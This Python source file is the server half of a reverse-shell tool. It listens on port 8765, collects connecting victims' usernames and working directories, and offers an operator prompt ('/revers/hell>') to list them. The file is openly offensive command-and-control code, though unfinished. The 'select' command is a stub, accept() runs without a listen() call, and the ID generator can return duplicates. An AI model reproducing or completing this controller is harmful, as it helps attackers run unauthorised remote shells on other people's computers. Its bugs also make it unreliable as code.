import socket
import random
from queue import Queue


class ReverServer:
    """
    This class is the reverse shell's server.
    It can handle multiple clients and modules
    """

    def __init__(self, port: int=None, host: str=None):
        """
        Init method

        :param port: The port the socket will be listening to
        :param host: The IP address of the host
        """
        # Checks if the vars are null
        if port is not None:
            self.port = port
        else:
            self.port = 8765
        if host is not None:
            self.host = host
        else:
            self.host = '0.0.0.0'

        # The list of clients connected to the server
        self.clients = []

        # Main queue
        self.queue = Queue()
        self.idlist = []

        # Socket
        try:
            self.s = socket.socket()
        except socket.error as err:
            print('[!} Socket creation failed: ' + str(err))

    def bind_socket(self):
        """
        Binds the socket to the predefined port.
        If it fails, it'll retry to bind it
        """
        try:
            self.s.bind((self.host, self.port))
        except socket.error as err:
            print('[!] Socket binding failed: ' + str(err))
            print('[!] Retrying...')
            self.bind_socket()

    def accept_connections(self):
        """
        Accepts new connections from clients
        """

        # Closes all connections
        for cli in self.clients:
            cli.s.close()

        # Clears list
        del self.clients[:]

        # Starts accepting new connections
        while True:
            try:
                # Creates a new client holder
                client = Client()

                # Accepts the connection
                conn, addr = self.s.accept()
                conn.setblocking(True)

                # Gets the name and the current working dir
                client.name = conn.recv(4096).decode('utf-8')
                client.cwd = conn.recv(4096).decode('utf-8')

                # Generates an id for the client
                client.id = self.gen_id()

                # Sets the connection and address info of the client
                client.s = conn
                client.address = addr

                # Prints out the connection info
                print('[*] New connection with {0}@{1}:{2}'.format(client.name, addr[0], addr[1]))

                # Adds the new client to the client list
                self.clients.append(client)
            except socket.error as err:
                print('[!] Error while accepting connection: ' + str(err))

    def gen_id(self):
        """
        Generates an ID
        :return: An unused ID
        """
        cid = random.choice(range(1024))
        if cid not in self.idlist:
            self.idlist.append(cid)
        else:
            self.gen_id()
        return cid

    def start(self):
        while True:
            cmd = input('/revers/hell> ')
            args = cmd.split()
            if len(cmd) == 0:
                continue
            elif args[0] == 'list':
                conns = self.list_connections()
                print(conns)
            elif args[0] == 'select':
                pass

    def list_connections(self):
        res = '\nNAME@IP:PORT\n\tC:\\CWD\\\n'
        for cli in self.clients:
            res += '{0}@{1}:{2}\n\t{3}\n'.format(cli.name, cli.address[0], cli.address[1], cli.cwd)
        return res


class Client:
    """
    This class holds informations about a client
    """

    def __init__(self):
        self.name = ''
        self.address = ''
        self.cwd = ''
        self.id = 0
        self.port = 0
        self.s = socket.socket()

    def send(self, data: bytes):
        self.s.send(data)
